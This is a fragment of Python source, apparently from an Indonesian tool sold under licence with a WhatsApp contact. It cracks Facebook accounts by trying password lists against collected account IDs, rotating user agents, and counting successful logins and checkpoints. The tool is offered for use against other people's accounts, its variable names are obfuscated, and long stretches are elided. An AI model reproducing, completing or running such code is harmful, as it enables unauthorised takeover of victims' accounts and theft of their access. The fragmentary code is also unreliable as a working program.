...
def banner():
	clear()
	wel = '# WELCOME TO CRACK ALFIN'
	wel2 = mark(wel, style='cyan')
	sol().print(wel2, style='on Blue')
	ise = '# wa:089690719275'
...
""")#line:49
    ...
    if OOO00O0OOO00OO00O in ['1','01']:#line:51
      print (f"{H}[{P}!{H}]{P} Send Message..");time .sleep (3 );os .system ('xdg-open https://wa.me/6289690719275?text=Bang+pin+scnya+eror/+hasil+gak+ada');exit ()#line:52
      ...
      if len (O000O000OOO000OOO )==0 :#line:55
        ...
        with requests .Session ()as O0O0OO0O0O00OOOO0 :#line:58
          OOO00OO00O0O0OOOO =O0O0OO0O0O00OOOO0 .get (f'https://app.cryptolens.io/api/key/activate?token=WyIxNjgwMjU4NiIsImUrS1h1eTAyY3lMa082bEJXcDlheWRLWXl3ZHFuYWhBSDJlY3hyaEIiXQ==&ProductId=14788&Key={O000O000OOO000OOO}&Sign=True').json ()['licenseKey']#line:59
...
logo = """\033[1;97m
        WELCOME TO SHARE FB LIMIT 30YAK
        TERGANTUNG DARI TOKEN AKUN\n
"""
f= "\033[1;97m==============================================================="
#tool created by axeyed tran.  if you get the source code please write the source
#=====Main=====#
...
def setting():
	...
	teks = '\33[37;1m[01] Crack Dari Akun Tertua (gampang cp)\n\33[37;1m[02] Crack Dari Akun Termuda (Dikit cp)\n\33[37;1m[03] Acak Urutan ID'
...
def crack(idf,pwv):
	...
	fff = '%'
	print('\r%s+> [ ALFIN NI ] %s/%s <<>> OK:%s <<>> CP:%s <<>> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
...
def crack3(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s+> [ ALFIN NI ]i %s/%s <-> OK:%s <-> CP:%s <-> %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
